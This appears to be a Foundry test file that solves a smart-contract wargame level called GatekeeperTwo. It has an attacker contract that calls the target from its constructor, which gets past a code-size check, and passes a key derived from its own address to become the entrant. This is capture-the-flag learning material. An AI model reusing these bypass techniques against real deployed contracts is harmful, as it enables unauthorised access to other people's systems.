// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/14_GatekeeperTwo.sol";

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeper public target;
    constructor(address _target) {
        target = IGatekeeper(_target);
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        target.enter(key);
    }
}
contract GatekeeperOneTest is Test {
    GatekeeperTwo public gt;
    GatekeeperTwoAttacker public ga;
    address public hacker = address(0x1337);

    function setUp() public {
        gt = new GatekeeperTwo();
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker, hacker);
        ga = new GatekeeperTwoAttacker(address(gt));
        assertEq(gt.entrant(), hacker);
        vm.stopPrank();
    }
}
